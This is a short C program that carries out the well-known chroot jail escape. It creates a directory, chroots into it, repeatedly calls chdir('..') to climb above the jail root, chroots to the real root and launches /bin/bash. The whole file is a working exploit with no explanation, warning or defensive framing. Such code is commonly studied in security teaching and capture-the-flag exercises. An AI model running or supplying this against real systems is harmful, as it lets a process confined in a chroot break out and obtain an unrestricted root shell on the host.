#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>

int main() {
  mkdir("chroot", 0755);
  chroot("chroot");

  for (int i = 0; i < 1000; ++i) {
    chdir("..");
  }

  chroot(".");
  system("/bin/bash");
  return 0;
}
